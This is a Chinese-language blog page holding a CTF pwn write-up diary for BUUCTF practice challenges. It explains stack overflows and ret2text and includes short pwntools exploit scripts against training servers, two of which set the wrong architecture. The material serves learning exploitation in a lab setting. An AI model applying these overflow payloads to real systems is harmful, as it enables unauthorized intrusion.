<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="pwnpwn日记">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn题日记-BUU版">
<meta property="og:url" content="https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/index.html">
<meta property="og:site_name" content="黄昏之时.">
<meta property="og:description" content="pwnpwn日记">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094324381-1628736991.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094300886-59213589.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094737150-1028764137.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719100646020-2036501141.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719103024440-957742830.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719104027888-666220103.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719104113058-1528688368.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113327966-1984837833.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113502655-1324286544.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113908714-701213526.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113327966-1984837833.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719114534544-625713294.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719114645182-1461339033.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719114835476-761884017.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719155056173-931428525.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719155142325-813977021.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719155802987-1870118075.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719160043587-1212245803.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719163105982-242494321.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719163203180-1312944885.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719163452409-836377749.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719191542016-1419439437.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719191436878-1756487929.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723150842642-493501482.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723151141744-1201944443.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723151822375-1481558494.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723151953572-1932074411.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723155734658-1792825118.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723155707223-1859630429.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723155836623-334973927.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723160231009-1966521130.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723162059482-452491860.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723162328529-250903826.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723163157549-511912284.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723163803318-884706692.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723170420607-232522171.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240723184904512-1498288762.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102338846-558865372.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102511006-2123606605.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102536807-647590419.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724102123898-963604324.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724195054068-829976743.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724195233416-1153168380.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240724195953911-592997116.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725093229161-1159862954.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725093423612-889846246.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100059309-385242951.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100201079-962214614.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100312040-858256791.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725100635826-856308375.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725102557097-1633438421.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725102639453-1656278905.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725104214852-1918520874.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725104008826-1011489388.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725104147587-2027964507.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725105510576-1026144114.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725193615892-561764441.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725193746683-1519689447.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725194027576-618908851.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725194719731-1213761943.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240725205532762-605705591.png">
<meta property="article:published_time" content="2024-09-25T03:42:12.000Z">
<meta property="article:modified_time" content="2024-10-08T08:20:22.103Z">
<meta property="article:author" content="bananaships">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094324381-1628736991.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>pwn题日记-BUU版</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/09/26/CS1-6%E7%A0%B4%E8%A7%A3%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/09/25/adb-Frida%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&text=pwn题日记-BUU版"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&is_video=false&description=pwn题日记-BUU版"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwn题日记-BUU版&body=Check out this article: https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&title=pwn题日记-BUU版"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&name=pwn题日记-BUU版&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bananashipsbbq.github.io/2024/09/25/pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU%E7%89%88/&t=pwn题日记-BUU版"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E9%A2%98%E6%97%A5%E8%AE%B0-BUU-%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%E3%80%82%E3%80%82%E3%80%82%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">pwn题日记[BUU]（持续更新中。。。）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-test-your-nc"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-rip"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-warmup-csaw-2016"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-n-1"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 ciscn_2019_n_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-pwn1-sctf-2016"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-jarvisoj-level0"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 [第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%A9%BF%E6%8F%92%E4%B8%80%E9%81%93%E8%BF%99%E5%91%A8%E6%89%93awd%E9%81%87%E5%88%B0%E7%9A%84pwn%E9%A2%98"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 (穿插一道这周打awd遇到的pwn题)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-jarvisoj-level2"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-ciscn-2019-n-8"><span class="toc-number">1.10.</span> <span class="toc-text">0x0A  ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-bjdctf-2020-babystack"><span class="toc-number">1.11.</span> <span class="toc-text">0x0B bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-ciscn-2019-c-1"><span class="toc-number">1.12.</span> <span class="toc-text">0x0C ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-get-started-3dsctf-2016"><span class="toc-number">1.13.</span> <span class="toc-text">0x0D get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E-jarvisoj-level2-x64"><span class="toc-number">1.14.</span> <span class="toc-text">0x0E jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-HarekazeCTF2019-baby-rop"><span class="toc-number">1.15.</span> <span class="toc-text">0x10 [HarekazeCTF2019]baby_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-others-shellcode"><span class="toc-number">1.16.</span> <span class="toc-text">0x11 others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-OGeek2019-babyrop"><span class="toc-number">1.17.</span> <span class="toc-text">0x12 [OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-ciscn-2019-n-5"><span class="toc-number">1.18.</span> <span class="toc-text">0x13 ciscn_2019_n_5</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        pwn题日记-BUU版
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">bananaships</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-25T03:42:12.000Z" class="dt-published" itemprop="datePublished">2024-09-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Writeup/">Writeup</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="pwn题日记-BUU-（持续更新中。。。）"><a href="#pwn题日记-BUU-（持续更新中。。。）" class="headerlink" title="pwn题日记[BUU]（持续更新中。。。）"></a>pwn题日记[BUU]（持续更新中。。。）</h1><h2 id="0x01-test-your-nc"><a href="#0x01-test-your-nc" class="headerlink" title="0x01 test_your_nc"></a>0x01 test_your_nc</h2><p>nc直接cat出了，没啥好说的。</p>
<h2 id="0x02-rip"><a href="#0x02-rip" class="headerlink" title="0x02 rip"></a>0x02 rip</h2><p>直接拉ida查看一下，标准的gets函数，大概率打一手缓冲区溢出的栈溢出</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094324381-1628736991.png" alt="image-20240719094324316"></p>
<p>先checksec一下看看保护和架构啥的，栈保护没开，直接锤</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094300886-59213589.png" alt="image-20240719094258625"></p>
<p>一开始打没打通，报错如下，看一下栈帧情况说是有点不对劲，然后网上又搜了一下，不是直接输入15个字符之后就直接能造成溢出了，这块儿还得加8个字符，因为栈溢出修改call指令保存在栈上的返回地址( 即 eip &#x2F; rip 的值)，这样cpu执行ret指令的时候，就会将被修改的值从栈上取出放入 eip&#x2F;rip 寄存器中，紧接着就会执行rip或eip所指地址处，至此完成了劫持程序控制流的操作。又该程序是64位的所以到ret之前还差8个字节（覆盖save rbp），因此需要15加上8个字符才能到retn。</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719094737150-1028764137.png" alt="image-20240719094736779"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;arm64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27232</span>)</span><br><span class="line">sysadress = <span class="number">0x40118A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">15</span>+<span class="number">8</span>)+p64(sysadress)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719100646020-2036501141.png" alt="image-20240719100645473"></p>
<h2 id="0x03-warmup-csaw-2016"><a href="#0x03-warmup-csaw-2016" class="headerlink" title="0x03 warmup_csaw_2016"></a>0x03 warmup_csaw_2016</h2><p>跟上一题一样的知识点，都是栈溢出然后ret2text，拿到题看到了一些之前没见过的函数，如下图，write是标准输出，然后去搜了一下sprintf，用于造格式化字符串的</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719103024440-957742830.png" alt="image-20240719103023891"></p>
<p>这题的考点还是在gets函数上面，直接造溢出就好了，记得是64位的程序，最后加8覆盖<code>save rbp</code>然后直接到retn。不用拿shell了属于是，直接cat flag了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719104027888-666220103.png" alt="image-20240719104027460"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;arm64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28785</span>)</span><br><span class="line"></span><br><span class="line">toadress = <span class="number">0x000000000040060D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>)+p64(toadress)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719104113058-1528688368.png" alt="image-20240719104112495"></p>
<h2 id="0x04-ciscn-2019-n-1"><a href="#0x04-ciscn-2019-n-1" class="headerlink" title="0x04 ciscn_2019_n_1"></a>0x04 ciscn_2019_n_1</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>拉进ida看一眼还是老朋友gets函数，直接造溢出就好了</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113327966-1984837833.png" alt="image-20240719113327322"></p>
<p>这边用ret2text的话需要把v2的位置也给覆盖掉，跟到v1的栈区，由于retn在RBP处之后，所以这块儿需要把v2的四个字节也给覆盖掉才能快乐地cat flag</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113502655-1324286544.png" alt="image-20240719113501958"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26678</span>)</span><br><span class="line">addres = <span class="number">0x00000000004006BE</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">44</span>+<span class="number">4</span>+<span class="number">8</span>) +  p64(addres) <span class="comment">#44为v1本身的长度，4是需要覆盖的v2的长度，8是64位程序距离retn的长度（ret2text嘛</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113908714-701213526.png" alt="image-20240719113908375"></p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>按照程序逻辑进行修改就好了，找到check用到的11.28125数字的</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719113327966-1984837833.png" alt="image-20240719113327322"></p>
<p>下图高亮处的值即为用于check的浮点数的16进制表示，双击跟过去取出来即可</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719114534544-625713294.png" alt="image-20240719114533841"></p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719114645182-1461339033.png" alt="image-20240719114644231"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26678</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span> + p64(<span class="number">0x41348000</span>) <span class="comment">#用于check的数直接覆盖在v1地址后面就好了，正常走程序逻辑</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719114835476-761884017.png" alt="image-20240719114835132"></p>
<h2 id="0x05-pwn1-sctf-2016"><a href="#0x05-pwn1-sctf-2016" class="headerlink" title="0x05 pwn1_sctf_2016"></a>0x05 pwn1_sctf_2016</h2><p>也是审上代码了说是，但是代码反编译得太狗屎，有个copy，但是大概意思没太懂</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719155056173-931428525.png" alt="image-20240719155055256"> </p>
<p>调一下看看逻辑，输入 I 看看，发现最后会就将 i 替换为 you 用来占字符</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719155142325-813977021.png" alt="image-20240719155141784"></p>
<p>这把没有老朋友gets函数打了，找了一下其他溢出点没太找到，但是这个交换值可以造溢出，把cat flag的函数地址找到之后，看一下输入值到 save ebp的距离，然后稍加计算，直接开打。又因是32位程序所以最后记得加 4 覆盖save ebp 然后就直接retn了。</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719155802987-1870118075.png" alt="image-20240719155802234"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25595</span>)</span><br><span class="line">adress = <span class="number">0x08048F0D</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(adress)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719160043587-1212245803.png" alt="image-20240719160043379"></p>
<h2 id="0x06-jarvisoj-level0"><a href="#0x06-jarvisoj-level0" class="headerlink" title="0x06 jarvisoj_level0"></a>0x06 jarvisoj_level0</h2><p>正常溢出题，一开始还以为read有什么不知道的可打的点，以为要在512字节之后造溢出，然后512+8之后发现打不通，再试试128+8然后就通了，就正常溢出，是我想多了，就跟打gets一样，后面的512是做输入限制的操作，这块儿完全够溢出了，所有不用理会</p>
<p><img src="https://img2023.cnblogs.com/blog/3445027/202407/3445027-20240719163105982-242494321.png" alt="image-20240719163105864"></p>
<p>exp:</p>
